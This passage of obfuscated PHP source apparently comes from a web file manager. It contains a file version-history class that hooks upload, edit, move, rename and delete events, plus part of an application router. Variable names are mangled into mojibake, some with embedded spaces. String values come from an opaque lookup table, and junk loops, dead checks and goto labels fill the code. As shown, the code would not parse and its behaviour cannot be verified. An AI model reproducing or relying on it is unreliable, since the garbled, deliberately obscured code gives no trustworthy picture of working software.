=& $_SERVER[ˆûùúÊ¯]; if ($û÷õ°¹[$ƒœ–‹[1273]]) { return !0; } write_log(array($ƒœ–‹[1274], $û÷õ°¹, $ÄòˆÀ’À), $ƒœ–‹[1275]); show_json($ƒœ–‹[1276] . json_encode($û÷õ°¹[$ƒœ–‹[1263]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $©ÓÓº‡Ó =& $_SERVER[ˆûùúÊ¯]; $•á—Êí… = $GLOBALS[$©ÓÓº‡Ó[6]][$©ÓÓº‡Ó[99]]; if ($•á—Êí…[$©ÓÓº‡Ó[1277]] != 1) { return; } if ($•á—Êí…[$©ÓÓº‡Ó[1278]] <= 0) { return; } if (isset($_REQUEST[$©ÓÓº‡Ó[1279]]) && $_REQUEST[$©ÓÓº‡Ó[1279]] == $©ÓÓº‡Ó[98]) { return; } Hook::bind($©ÓÓº‡Ó[1280], $©ÓÓº‡Ó[1281]); Hook::bind($©ÓÓº‡Ó[1282], $©ÓÓº‡Ó[1283]); Hook::bind($©ÓÓº‡Ó[1284], $©ÓÓº‡Ó[1285]); Hook::bind($©ÓÓº‡Ó[1286], $©ÓÓº‡Ó[1287]); Hook::bind($©ÓÓº‡Ó[1288], $©ÓÓº‡Ó[1289]); Hook::bind($©ÓÓº‡Ó[1290], $©ÓÓº‡Ó[1291]); } public static function eventBeforeUpload($Ğä¬©³ï) { if ($Ğä¬©³ï[3] && $Ğä¬©³ï[3] != REPEAT_REPLACE) { return; } $Ç¶¢´à§ = self::parsePath($Ğä¬©³ï[0]); if (!$Ç¶¢´à§) { return; } self::add($Ç¶¢´à§); } public static function eventBeforeEdit($×¦¶õ®Ş) { $ä¦ÊÕ©¤ = self::parsePath($×¦¶õ®Ş[0]); if (!$ä¦ÊÕ©¤) { return; } self::add($ä¦ÊÕ©¤); } public static function eventBeforeCopyFile($Ø¼š¶åş, $ËÉäÑÓƒ, $à„õˆÆ¤, $Á©¤¤ı, $À“²·©…, $Æ„¡óú) { $ºë”÷è® =& $_SERVER[ˆûùúÊ¯]; if (isset($à„õˆÆ¤->_data[$ºë”÷è®[1216]]) && $à„õˆÆ¤->_data[$ºë”÷è®[1216]]) { return; } $‡ší£Îê = $à„õˆÆ¤->getPathOuter($Á©¤¤ı); $‘ÌÊêŠÀ = self::parsePath($‡ší£Îê); if (!$‘ÌÊêŠÀ) { return; } self::add($‘ÌÊêŠÀ); } public static function eventBeforeRename($ó½±ÇÌ) { $Ì—×È·Œ =& $_SERVER[ˆûùúÊ¯]; $±ñ¾éàƒ = self::parsePath($ó½±ÇÌ[0]); if (!$±ñ¾éàƒ) { return; } $ôğÅõö¡ = self::checkInHistory($±ñ¾éàƒ); if (!$ôğÅõö¡) { return; } if ($ôğÅõö¡[$Ì—×È·Œ[43]] == $Ì—×È·Œ[223]) { $ıüƒ¬•è = self::listData($±ñ¾éàƒ); if ($ıüƒ¬•è && $ıüƒ¬•è[$Ì—×È·Œ[421]]) { self::moveHistory($±ñ¾éàƒ, $ó½±ÇÌ[1]); } } else { IO::rename($ôğÅõö¡[$Ì—×È·Œ[94]], $ó½±ÇÌ[1]); } } public static function eventBeforeMove($¦¶ãÙú­) { $‡²³€ò =& $_SERVER[ˆûùúÊ¯]; $ü°¾äÚŞ = self::parsePath($¦¶ãÙú­[0]); if (!$ü°¾äÚŞ) { return; } $¾˜ÈßòŒ = self::parsePath($¦¶ãÙú­[1]); if (!$¾˜ÈßòŒ) { return; } $´£³Áëä = $¦¶ãÙú­[3]; $±ëº×Š = self::checkInHistory($ü°¾äÚŞ); if (!$±ëº×Š) { return; } $ëç­ˆ’ = self::pathHistory($¾˜ÈßòŒ); if ($±ëº×Š[$‡²³€ò[43]] == $‡²³€ò[223]) { $¸‡³î¿á = self::listData($ü°¾äÚŞ); $³àÅĞ‘Ë = rtrim($¾˜ÈßòŒ, $‡²³€ò[8]) . $‡²³€ò[8] . ($´£³Áëä ? $´£³Áëä : get_path_this($ü°¾äÚŞ)); $Ô³ Ë§» = self::listData($³àÅĞ‘Ë); if ($¸‡³î¿á && $¸‡³î¿á[$‡²³€ò[421]] && $Ô³ Ë§» && $Ô³ Ë§»[$‡²³€ò[421]]) { return self::clear($ü°¾äÚŞ); } if ($¸‡³î¿á && $¸‡³î¿á[$‡²³€ò[421]]) { self::moveHistory($ü°¾äÚŞ, $´£³Áëä, $ëç­ˆ’); } } else { IO::move($±ëº×Š[$‡²³€ò[94]], $ëç­ˆ’, !1, $´£³Áëä); self::clearEmptyFolder(IO::pathFather($±ëº×Š[$‡²³€ò[94]])); } } public static function eventAfterRemove($¬Íëñœ, $›•ˆ¼×Ÿ) { $¿ÆæüÓù =& $_SERVER[ˆûùúÊ¯]; if (!$›•ˆ¼×Ÿ) { return; } $Ôå¡Èº¤ = self::parsePath($¬Íëñœ[0]); if (!$Ôå¡Èº¤) { return; } $ÈüöœÚú = self::checkInHistory($Ôå¡Èº¤); if (!$ÈüöœÚú) { return; } if ($ÈüöœÚú[$¿ÆæüÓù[43]] == $¿ÆæüÓù[223]) { $Ÿ¦’¯¡Œ = self::listData($Ôå¡Èº¤, !1); if ($Ÿ¦’¯¡Œ && $Ÿ¦’¯¡Œ[$¿ÆæüÓù[421]]) { self::clear($Ôå¡Èº¤, !1); } } else { IO::remove($ÈüöœÚú[$¿ÆæüÓù[94]]); self::clearEmptyFolder(IO::pathFather($ÈüöœÚú[$¿ÆæüÓù[94]])); } } private static function checkInHistory($‰èí›«û) { $¿Õø¢ï = self::pathHistory($‰èí›«û); if (!IO::exist($¿Õø¢ï)) { $¿Õø¢ï .= $_SERVER[ˆûùúÊ¯][1292]; } return IO::exist($¿Õø¢ï) ? IO::info($¿Õø¢ï) : !1; } private static function parsePath($®¹é§ò„) { $ÜŞ—¹¯‘ =& $_SERVER[ˆûùúÊ¯]; if (!$®¹é§ò„) { return !1; } if ($GLOBALS[$ÜŞ—¹¯‘[1293]]) { return; } $—ë–Óü = KodIO::parse($®¹é§ò„); $˜Ô¢Èéé = $—ë–Óü[$ÜŞ—¹¯‘[43]]; $™ß„Öàß = !$˜Ô¢Èéé || $˜Ô¢Èéé == KodIO::KOD_IO || $˜Ô¢Èéé == KodIO::KOD_SHARE_ITEM; if (!$™ß„Öàß || !$—ë–Óü[$ÜŞ—¹¯‘[1294]]) { return !1; } if (substr($®¹é§ò„, 0, strlen(DATA_PATH . $ÜŞ—¹¯‘[1295])) == DATA_PATH . $ÜŞ—¹¯‘[1295]) { return !1; } if ($˜Ô¢Èéé == KodIO::KOD_SHARE_ITEM) { $ˆŠ…´è¡ = IO::init($®¹é§ò„); if ($ˆŠ…´è¡->pathParse[$ÜŞ—¹¯‘[1212]]) { return self::parsePath($ˆŠ…´è¡->pathParse[$ÜŞ—¹¯‘[1212]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¿¿àöÆ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÜŞ—¹¯‘[1296]); foreach ($¿¿àöÆ as $Öû“×í) { if (!$˜Ô¢Èéé && substr($®¹é§ò„, 0, strlen($Öû“×í)) == $Öû“×í) { return !1; } } self::log($GLOBALS[$ÜŞ—¹¯‘[1207]] . $ÜŞ—¹¯‘[1297] . $®¹é§ò„); return $®¹é§ò„; } private static function pathHistory($Æ•¤şÊú) { $Ê±–Úü³ =& $_SERVER[ˆûùúÊ¯]; $³×¾ü• = self::$_historyBase . ltrim(KodIO::clear($Æ•¤şÊú), $Ê±–Úü³[8]); $³×¾ü• = str_replace(array($Ê±–Úü³[1298]), array($Ê±–Úü³[1299]), $³×¾ü•); return $³×¾ü•; } public static function log($ê›‚×) { } public static function historyCount($‰Ë¬ÒšØ) { $Ü‘œ™ =& $_SERVER[ˆûùúÊ¯]; $ËÆ›˜´î = array(); $æ¿ˆÆé¶ = array(); foreach ($‰Ë¬ÒšØ as $ÉÏ‡£¼“) { $ áïà¬« = get_path_father($ÉÏ‡£¼“); if (!$æ¿ˆÆé¶[$ áïà¬«]) { $æ¿ˆÆé¶[$ áïà¬«] = array(); } $æ¿ˆÆé¶[$ áïà¬«][] = get_path_this($ÉÏ‡£¼“); } foreach ($æ¿ˆÆé¶ as $ áïà¬« => $öÂ†İ²¼) { $¦¥÷íØ„ = self::parsePath($ áïà¬«); if (!$¦¥÷íØ„) { continue; } foreach ($öÂ†İ²¼ as $Ö®ıç­) { $©ÙÃœ£ª = self::listData(rtrim($¦¥÷íØ„, $Ü‘œ™[8]) . $Ü‘œ™[8] . $Ö®ıç­, !1); if ($©ÙÃœ£ª && $©ÙÃœ£ª[$Ü‘œ™[421]]) { $ËÆ›˜´î[rtrim($ áïà¬«, $Ü‘œ™[8]) . $Ü‘œ™[8] . $Ö®ıç­] = count($©ÙÃœ£ª[$Ü‘œ™[421]]); } } } return $ËÆ›˜´î; } public static function add($éÚ“¥) { $Ú–Ì÷ˆş =& $_SERVER[ˆûùúÊ¯]; $×ìŸ¥¬« = self::listData($éÚ“¥); if (!$×ìŸ¥¬«) { return; } $¡½”ıŸö = Model($Ú–Ì÷ˆş[830])->get($Ú–Ì÷ˆş[1300]); $–¶ıÀÁÎ = $GLOBALS[$Ú–Ì÷ˆş[6]][$Ú–Ì÷ˆş[99]][$Ú–Ì÷ˆş[1278]]; $›ÌÅó­ˆ = $¡½”ıŸö == $Ú–Ì÷ˆş[1301] ? min(5, $–¶ıÀÁÎ) : $–¶ıÀÁÎ; if ($–¶ıÀÁÎ <= 0) { return; } $…‘°—ôŒ = IO::info($éÚ“¥); $ÆÂ­æ÷Á = $×ìŸ¥¬«[$Ú–Ì÷ˆş[421]]; if ($…‘°—ôŒ[$Ú–Ì÷ˆş[86]] == 0) { return; } if ($…‘°—ôŒ[$Ú–Ì÷ˆş[86]] >= 1024 * 1024 * 500) { return !1; } $Í¶²·´“ = IO::hashSimple($éÚ“¥); if ($ÆÂ­æ÷Á && $ÆÂ­æ÷Á[0][$Ú–Ì÷ˆş[648]] == $Í¶²·´“) { return !0; } if (array_key_exists($Ú–Ì÷ˆş[226], $…‘°—ôŒ) && !$…‘°—ôŒ[$Ú–Ì÷ˆş[226]]) { return !1; } $­†™òîâ = short_id(time()); $ÎéÆ¦ê = array($Ú–Ì÷ˆş[451] => $­†™òîâ, $Ú–Ì÷ˆş[648] => $Í¶²·´“, $Ú–Ì÷ˆş[42] => $…‘°—ôŒ[$Ú–Ì÷ˆş[42]] . $Ú–Ì÷ˆş[10] . date($Ú–Ì÷ˆş[1302]) . rand_string(1), $Ú–Ì÷ˆş[86] => $…‘°—ôŒ[$Ú–Ì÷ˆş[86]], $Ú–Ì÷ˆş[503] => USER_ID, $Ú–Ì÷ˆş[224] => time(), $Ú–Ì÷ˆş[1303] => $Ú–Ì÷ˆş[12]); IO::mkdir($×ìŸ¥¬«[$Ú–Ì÷ˆş[1304]]); $Ä£€Ê½Ö = IO::copy($éÚ“¥, $×ìŸ¥¬«[$Ú–Ì÷ˆş[1304]], !1, $ÎéÆ¦ê[$Ú–Ì÷ˆş[42]]); if (!$Ä£€Ê½Ö) { self::clearEmptyFolder($×ìŸ¥¬«[$Ú–Ì÷ˆş[1304]]); return !1; } array_unshift($ÆÂ­æ÷Á, $ÎéÆ¦ê); if (count($ÆÂ­æ÷Á) > $›ÌÅó­ˆ) { $ŞØÍÂ“³ = array_slice($ÆÂ­æ÷Á, $›ÌÅó­ˆ); foreach ($ŞØÍÂ“³ as $¾©±º¶µ) { IO::remove($×ìŸ¥¬«[$Ú–Ì÷ˆş[1304]] . $¾©±º¶µ[$Ú–Ì÷ˆş[42]]); } $ÆÂ­æ÷Á = array_slice($ÆÂ­æ÷Á, 0, $›ÌÅó­ˆ); } return self::saveData($×ìŸ¥¬«[$Ú–Ì÷ˆş[1305]], $ÆÂ­æ÷Á); } public static function remove($ÅşÅÙı¡, $„–É˜¬Œ) { $¸¶‡Èæš =& $_SERVER[ˆûùúÊ¯]; $…Üñ×ÙÓ = self::listData($ÅşÅÙı¡); $–°ğ¾¤À = array(); if (!$…Üñ×ÙÓ) { return !1; } foreach ($…Üñ×ÙÓ[$¸¶‡Èæš[421]] as $—ßü¾Ø®) { if ($—ßü¾Ø®[$¸¶‡Èæš[451]] == $„–É˜¬Œ) { IO::remove($…Üñ×ÙÓ[$¸¶‡Èæš[1304]] . $—ßü¾Ø®[$¸¶‡Èæš[42]]); continue; } $–°ğ¾¤À[] = $—ßü¾Ø®; } return self::saveData($…Üñ×ÙÓ[$¸¶‡Èæš[1305]], $–°ğ¾¤À); } public static function clear($‚âó®ãÒ, $Õ£‘Ê’ = true) { $Ã¼å•Ğë =& $_SERVER[ˆûùúÊ¯]; $äÆâ‘ = self::listData($‚âó®ãÒ, $Õ£‘Ê’); if (!$äÆâ‘) { return !1; } foreach ($äÆâ‘[$Ã¼å•Ğë[421]] as $îÛØ°Àù) { IO::remove($äÆâ‘[$Ã¼å•Ğë[1304]] . $îÛØ°Àù[$Ã¼å•Ğë[42]]); } return self::saveData($äÆâ‘[$Ã¼å•Ğë[1305]], array()); } public static function moveHistory($ı“ìü‘Ñ, $ùšöŒèØ = '', $Ñäß´ = '') { $ˆ«ê§ğ® =& $_SERVER[ˆûùúÊ¯]; $ÒÊ£Äé‹ = self::listData($ı“ìü‘Ñ, !1); if (!$ÒÊ£Äé‹ || !$ÒÊ£Äé‹[$ˆ«ê§ğ®[421]]) { return !1; } $Ø÷º¸Õ = $ˆ«ê§ğ®[1292]; $ùšöŒèØ = $ùšöŒèØ ? $ùšöŒèØ : get_path_this($ı“ìü‘Ñ); $Ñäß´ = $Ñäß´ ? $Ñäß´ : $ÒÊ£Äé‹[$ˆ«ê§ğ®[1304]]; $ƒŒ³àõ¶ = substr(get_path_this($ÒÊ£Äé‹[$ˆ«ê§ğ®[1305]]), 0, -strlen($Ø÷º¸Õ)); foreach ($ÒÊ£Äé‹[$ˆ«ê§ğ®[421]] as $çæ÷ó¡á => $Í›¹»ı°) { $ß¬ÃØ¦û = $ùšöŒèØ . substr($Í›¹»ı°[$ˆ«ê§ğ®[42]], strlen($ƒŒ³àõ¶)); $È­ìˆÁÜ = IO::move($ÒÊ£Äé‹[$ˆ«ê§ğ®[1304]] . $Í›¹»ı°[$ˆ«ê§ğ®[42]], $Ñäß´, !1, $ß¬ÃØ¦û); if ($È­ìˆÁÜ) { $ÒÊ£Äé‹[$ˆ«ê§ğ®[421]][$çæ÷ó¡á][$ˆ«ê§ğ®[42]] = $ß¬ÃØ¦û; } } $ÒÊ£Äé‹[$ˆ«ê§ğ®[1305]] = IO::move($ÒÊ£Äé‹[$ˆ«ê§ğ®[1305]], $Ñäß´, !1, $ùšöŒèØ . $Ø÷º¸Õ); self::saveData($ÒÊ£Äé‹[$ˆ«ê§ğ®[1305]], $ÒÊ£Äé‹[$ˆ«ê§ğ®[421]]); self::clearEmptyFolder($ÒÊ£Äé‹[$ˆ«ê§ğ®[1304]]); } public static function rollback($Ô‡ˆê©‘, $Ê©··®) { $öÇÈìÌ =& $_SERVER[ˆûùúÊ¯]; $‰ìƒº½İ = self::listData($Ô‡ˆê©‘); if (!$‰ìƒº½İ) { return; } $™­¸ÖŒï = IO::info($Ô‡ˆê©‘); foreach ($‰ìƒº½İ[$öÇÈìÌ[421]] as $Ş§¾ˆû => $ùßòë„ö) { if ($ùßòë„ö[$öÇÈìÌ[451]] == $Ê©··®) { self::add($Ô‡ˆê©‘); $ÓÆÖ¾ìÆ = $‰ìƒº½İ[$öÇÈìÌ[1304]] . $ùßòë„ö[$öÇÈìÌ[42]]; $ïÚ×•—ù = IO::copy($ÓÆÖ¾ìÆ, IO::pathFather($Ô‡ˆê©‘), REPEAT_REPLACE, $™­¸ÖŒï[$öÇÈìÌ[42]]); if ($ïÚ×•—ù) { self::remove($Ô‡ˆê©‘, $Ê©··®); } return $ïÚ×•—ù; } } return !1; } public static function setDetail($³åª¢‘, $í£ÃæåÖ, $åÜ°üÑ‹) { $ß÷ù’®ó =& $_SERVER[ˆûùúÊ¯]; $“‚Ü¤Òâ = self::listData($³åª¢‘); if (!$“‚Ü¤Òâ) { return; } foreach ($“‚Ü¤Òâ[$ß÷ù’®ó[421]] as $÷…ø¾œ¦ => $¢¶şÔŞè) { if ($¢¶şÔŞè[$ß÷ù’®ó[451]] == $í£ÃæåÖ) { $“‚Ü¤Òâ[$ß÷ù’®ó[421]][$÷…ø¾œ¦][$ß÷ù’®ó[1303]] = $åÜ°üÑ‹; self::saveData($“‚Ü¤Òâ[$ß÷ù’®ó[1305]], $“‚Ü¤Òâ[$ß÷ù’®ó[421]]); return !0; } } return !1; } public static function fileInfo($²®««ôƒ, $™¯ì€û†) { $¬Á—» =& $_SERVER[ˆûùúÊ¯]; $Ô£ä²á› = self::listData($²®««ôƒ); if (!$Ô£ä²á›) { show_json(LNG($¬Á—»[115]), !1); } $¨«Ô…ö­ = $¬Á—»[12]; foreach ($Ô£ä²á›[$¬Á—»[421]] as $Ï”ûØ¬ => $ììÏ’ô˜) { if ($ììÏ’ô˜[$¬Á—»[451]] != $™¯ì€û†) { continue; } $¨«Ô…ö­ = $Ô£ä²á›[$¬Á—»[1304]] . $ììÏ’ô˜[$¬Á—»[42]]; break; } if (!$¨«Ô…ö­) { show_json(LNG($¬Á—»[115]), !1); } return IO::info($¨«Ô…ö­); } public static function fileOut($º‘óÚª», $±½áêÂ™, $øÛç¥ß = false) { $ˆîˆƒ =& $_SERVER[ˆûùúÊ¯]; $ò×ğÑàˆ = self::fileInfo($º‘óÚª», $±½áêÂ™); $íÛöşã­ =& $GLOBALS[$ˆîˆƒ[7]]; $øÛç¥ß = isset($íÛöşã­[$ˆîˆƒ[1255]]) && $íÛöşã­[$ˆîˆƒ[1255]] == 1; if (isset($íÛöşã­[$ˆîˆƒ[43]]) && $íÛöşã­[$ˆîˆƒ[43]] == $ˆîˆƒ[1306]) { return IO::fileOutImage($ò×ğÑàˆ[$ˆîˆƒ[94]], $íÛöşã­[$ˆîˆƒ[1307]]); } IO::fileOut($ò×ğÑàˆ[$ˆîˆƒ[94]], $øÛç¥ß, get_path_this($º‘óÚª»)); } public static function listData($Ê‹áŞô, $Î”°»Î¤ = true) { $¥‹ô× =& $_SERVER[ˆûùúÊ¯]; if ($Î”°»Î¤ && !IO::exist($Ê‹áŞô)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ê‹áŞô, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ü‹õ†‹„ = self::pathHistory($Ê‹áŞô); $İ¸‰¿øş = array($¥‹ô×[1305] => $Ü‹õ†‹„ . $¥‹ô×[1292], $¥‹ô×[1304] => rtrim(get_path_father($Ü‹õ†‹„), $¥‹ô×[8]) . $¥‹ô×[8], $¥‹ô×[421] => array()); $‚¼•şúé = IO::getContent($İ¸‰¿øş[$¥‹ô×[1305]]); if ($‚¼•şúé) { $ä¡›–”ò = json_decode($‚¼•şúé, !0); if (is_array($ä¡›–”ò)) { $İ¸‰¿øş[$¥‹ô×[421]] = $ä¡›–”ò; } } return $İ¸‰¿øş; } private static function saveData($¦ƒ·ÍêÌ, $ï»ß¡‘) { $ïîƒ¤ë =& $_SERVER[ˆûùúÊ¯]; self::log($ïîƒ¤ë[1308] . $¦ƒ·ÍêÌ . $ïîƒ¤ë[81] . count($ï»ß¡‘), $ïîƒ¤ë[811]); if ($ï»ß¡‘) { return IO::setContent($¦ƒ·ÍêÌ, json_encode($ï»ß¡‘)); } $–šÖÍ†˜ = IO::pathFather($¦ƒ·ÍêÌ); IO::remove($¦ƒ·ÍêÌ); self::clearEmptyFolder($–šÖÍ†˜); return !0; } public static function clearEmptyFolder($Ş—§îÄ) { $½ú¢ãå =& $_SERVER[ˆûùúÊ¯]; if (trim($Ş—§îÄ, $½ú¢ãå[8]) == trim(self::$_historyBase, $½ú¢ãå[8])) { return; } $õüñş = IO::pathFather($Ş—§îÄ); $é¥¶«Ü´ = IO::has($Ş—§îÄ, !0); if ($é¥¶«Ü´[$½ú¢ãå[232]] > 0 || $é¥¶«Ü´[$½ú¢ãå[233]] > 0) { return; } IO::remove($Ş—§îÄ); self::clearEmptyFolder($õüñş); } private static function getBasePath() { $èÚŒİ§ô =& $_SERVER[ˆûùúÊ¯]; $øÕ­‚Ø = Model($èÚŒİ§ô[1309])->get($èÚŒİ§ô[1310]); if ($øÕ­‚Ø) { if (!IO::exist($øÕ­‚Ø)) { IO::mkdir($øÕ­‚Ø); } if (get_path_this($øÕ­‚Ø) == $èÚŒİ§ô[1295]) { $ı°óÏ²ñ = $èÚŒİ§ô[1311] . rand_string(8); @rename($øÕ­‚Ø, get_path_father($øÕ­‚Ø) . $èÚŒİ§ô[8] . $ı°óÏ²ñ); $øÕ­‚Ø = DATA_PATH . $ı°óÏ²ñ . $èÚŒİ§ô[8]; file_put_contents(DATA_PATH . $èÚŒİ§ô[1245], $èÚŒİ§ô[12]); Model($èÚŒİ§ô[1309])->set($èÚŒİ§ô[1310], $øÕ­‚Ø); } return $øÕ­‚Ø; } $øÕ­‚Ø = DATA_PATH . $èÚŒİ§ô[1311] . rand_string(8) . $èÚŒİ§ô[8]; $øÕ­‚Ø = IO::mkdir($øÕ­‚Ø); $øÕ­‚Ø = rtrim($øÕ­‚Ø, $èÚŒİ§ô[8]) . $èÚŒİ§ô[8]; file_put_contents($øÕ­‚Ø . $èÚŒİ§ô[1245], $èÚŒİ§ô[12]); file_put_contents(DATA_PATH . $èÚŒİ§ô[1245], $èÚŒİ§ô[12]); Model($èÚŒİ§ô[1309])->set($èÚŒİ§ô[1310], $øÕ­‚Ø); return $øÕ­‚Ø; } } goto bê Ä‡Ï…À; C¼†«¦‰öŠ: if (!$jucygqvtrz) { die; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($©èŠíõª) { $ğ™ğ¼£İ =& $_SERVER[ˆûùúÊ¯]; $Ÿ‹à¾Éº =& $_SERVER[‚¥ÜÊŒß]; $£Á«ëÍÊ = explode($Ÿ‹à¾Éº[0], trim($©èŠíõª, $Ÿ‹à¾Éº[0])); $this->defaultModule = $£Á«ëÍÊ[0] ? $£Á«ëÍÊ[0] : $this->defaultModule; $éËØÖèã = $ğ™ğ¼£İ[660]; if (strlen($éËØÖèã) < $ğ™ğ¼£İ[661]) { die; } $this->defaultController = $£Á«ëÍÊ[1] ? $£Á«ëÍÊ[1] : $this->defaultController; $¬Ã®¬‡ª = $ğ™ğ¼£İ[662]; if (!$¬Ã®¬‡ª) { return; } $this->defaultAction = $£Á«ëÍÊ[2] ? $£Á«ëÍÊ[2] : $this->defaultAction; $Ù‰‰ûó¾ = $ğ™ğ¼£İ[663]; if (strlen($Ù‰‰ûó¾) < $ğ™ğ¼£İ[664]) { die; } $this->ojgn2ded7f6e($Ÿ‹à¾Éº[1], array($this, $Ÿ‹à¾Éº[2])); $äÚ­…ç÷ = $ğ™ğ¼£İ[665]; while ($äÚ­…ç÷ < $ğ™ğ¼£İ[661]) { if ($äÚ­…ç÷ >= 0) { break; } $äÚ­…ç÷++; } } public function appRun($ñ¹‰÷£€) { $ÑİáİÛŞ =& $_SERVER[ˆûùúÊ¯]; $„¦æÒÔÛ =& $_SERVER[‚¥ÜÊŒß]; $ØîäÖÆƒ = explode($„¦æÒÔÛ[0], $ñ¹‰÷£€); $ëÕÃ²¡ = strtolower($ØîäÖÆƒ[0]); $ß’ÀôÃ° = $ÑİáİÛŞ[666]; $í¡²Ÿ‘Ú = $„¦æÒÔÛ[3]; $Ç½ÛÖ„ = $ÑİáİÛŞ[667]; if (!$Ç½ÛÖ„) { die; } if ($ëÕÃ²¡ == $„¦æÒÔÛ[4]) { $í¡²Ÿ‘Ú = $„¦æÒÔÛ[5]; $ØîäÖÆƒ[0] = $„¦æÒÔÛ[6]; $ØîäÖÆƒ[1] = $ØîäÖÆƒ[1] . $„¦æÒÔÛ[7]; $ñ¹‰÷£€ = join($„¦æÒÔÛ[0], $ØîäÖÆƒ); $ñ¹‰÷£€ = trim($ñ¹‰÷£€, $„¦æÒÔÛ[0]); } call_user_func(array($„¦æÒÔÛ[8], $„¦æÒÔÛ[9]), $í¡²Ÿ‘Ú . $„¦æÒÔÛ[10], $ñ¹‰÷£€); ActionCall($ñ¹‰÷£€); call_user_func(array($„¦æÒÔÛ[8], $„¦æÒÔÛ[9]), $í¡²Ÿ‘Ú . $„¦æÒÔÛ[11], $ñ¹‰÷£€); $Í¸ÁÎúÆ = $ÑİáİÛŞ[668]; if (!$Í¸ÁÎúÆ) { return; } } private function autorun() { $¦Ø¡÷šÃ =& $_SERVER[ˆûùúÊ¯]; $¨àì½‘¼ =& $_SERVER[‚¥ÜÊŒß]; global $config; $Òî†ÙöÍ = $¦Ø¡÷šÃ[669]; while (strlen($Òî†ÙöÍ) < $¦Ø¡÷šÃ[19]) { if (!$Òî†ÙöÍ) { break; } $Òî†ÙöÍ++; } if (count($config[$¨àì½‘¼[12]]) == 0) { return; } foreach ($config[$¨àì½‘¼[12]] as $—ÊÖ³†Ü => $¬şäÕÛÔ) { $this->appRun($¬şäÕÛÔ); $ğÑ‘ë¡æ = $¦Ø¡÷šÃ[670]; while ($ğÑ‘ë¡æ < $¦Ø¡÷šÃ[19]) { if ($ğÑ‘ë¡æ >= 0) { break; } $ğÑ‘ë¡æ++; } } } private function wyka7e788d78() { $½êè„Öä =& $_SERVER[ˆûùúÊ¯]; $ıúôä£§ =& $_SERVER[‚¥ÜÊŒß]; $¼Ú€š¯ = $ıúôä£§[4]; $Ì«À“ÍÇ = $GLOBALS[$ıúôä£§[13]][$ıúôä£§[14]][0]; if (!$Ì«À“ÍÇ || strlen($Ì«À“ÍÇ) <= strlen($¼Ú€š¯)) { return; } if (strtolower(substr($Ì«À“ÍÇ, -strlen($¼Ú€š¯))) != $¼Ú€š¯) { return; } $§é®èª¿ = substr($Ì«À“ÍÇ, 0, -strlen($¼Ú€š¯)); $ŠşóÕ™¢ = $½êè„Öä[671]; if (strlen($ŠşóÕ™¢) < $½êè„Öä[672]) { die; } $­ ôäÅ¦ = array($ıúôä£§[4], $§é®èª¿); $äÃËö—Œ = array_slice($GLOBALS[$ıúôä£§[13]][$ıúôä£§[14]], 1); $GLOBALS[$ıúôä£§[13]][$ıúôä£§[14]] = array_merge($­ ôäÅ¦, $äÃËö—Œ); $øèµÙ·ú = $½êè„Öä[673]; while ($øèµÙ·ú < $½êè„Öä[664]) { if ($øèµÙ·ú >= 0) { break; } $øèµÙ·ú++; } $GLOBALS[$ıúôä£§[13]][$ıúôä£§[15]] = implode($ıúôä£§[0], $GLOBALS[$ıúôä£§[13]][$ıúôä£§[14]]); } private function tiqvf5e79ef6() { $òïŞ ¢ =& $_SERVER[ˆûùúÊ¯]; $’‡şŸ™ =& $_SERVER[‚¥ÜÊŒß]; if ($GLOBALS[$’‡şŸ™[13]][$’‡şŸ™[15]] != $’‡şŸ™[6]) { return; } $ÔæòÑî = $_SERVER[$’‡şŸ™[16]]; $Š„Àì¦ø = $’‡şŸ™[17]; if (!strstr($ÔæòÑî, $Š„Àì¦ø)) { return; } $Åé’§ìÕ = strrpos($ÔæòÑî, $Š„Àì¦ø); $¨öÅ«á¸ = $òïŞ ¢[674]; while (strlen($¨öÅ«á¸) < $òïŞ ¢[672]) { if (!$¨öÅ«á¸) { break; } $¨öÅ«á¸++; } $«è×¶Íô = substr($ÔæòÑî, $Åé’§ìÕ + strlen($Š„Àì¦ø)); $¸ÖÇ÷ˆÂ = $òïŞ ¢[675]; preg_match_all($’‡şŸ™[18], $«è×¶Íô, $›Ş”…ûœ); $Ã¦„é…ˆ = $òïŞ ¢[676]; if (strlen($Ã¦„é…ˆ) < $òïŞ ¢[672]) { return; } $«è×¶Íô = trim($›Ş”…ûœ[0][0], $’‡şŸ™[19]); $õÊ°šËÓ = $òïŞ ¢[677]; if (strlen($õÊ°šËÓ) < $òïŞ ¢[672]) { return; } $GLOBALS[$’‡şŸ™[13]][$’‡şŸ™[14]] = explode($’‡şŸ™[19], $«è×¶Íô); $çİïø‡ú = $òïŞ ¢[678]; while (strlen($çİïø‡ú) < $òïŞ ¢[661]) { if (!$çİïø‡ú) { break; } $çİïø‡ú++; } $GLOBALS[$’‡şŸ™[13]][$’‡şŸ™[15]] = implode($’‡şŸ™[0], $GLOBALS[$’‡şŸ™[13]][$’‡şŸ™[14]]); $æëöôñ = $òïŞ ¢[679]; if (strlen($æëöôñ) < $òïŞ ¢[19]) { return; } } public function run() { $Ùöƒˆêô =& $_SERVER[ˆûùúÊ¯]; $ÃùşÍÅ =& $_SERVER[‚¥ÜÊŒß]; $this->tiqvf5e79ef6(); $¢§èÉŠ = $Ùöƒˆêô[680]; if (strlen($¢§èÉŠ) < $Ùöƒˆêô[681]) { return; } $this->wyka7e788d78(); $µòÚÅù• = $GLOBALS[$ÃùşÍÅ[13]][$ÃùşÍÅ[14]]; $¼³ôöŞĞ = $Ùöƒˆêô[682]; if (!$¼³ôöŞĞ) { return; } $Ã¡œ•˜° = $GLOBALS[$ÃùşÍÅ[13]][$ÃùşÍÅ[15]]; define($ÃùşÍÅ[20], isset($µòÚÅù•[0]) && $µòÚÅù•[0] ? $µòÚÅù•[0] : $this->defaultModule); $—ùñ¬ê© = $Ùöƒˆêô[683]; while ($—ùñ¬ê© < $Ùöƒˆêô[19]) { if ($—ùñ¬ê© >= 0) { break; } $—ùñ¬ê©++; } define($ÃùşÍÅ[21], isset($µòÚÅù•[1]) && $µòÚÅù•[0] ? $µòÚÅù•[1] : $this->defaultController); define($ÃùşÍÅ[22], isset($µòÚÅù•[2]) && 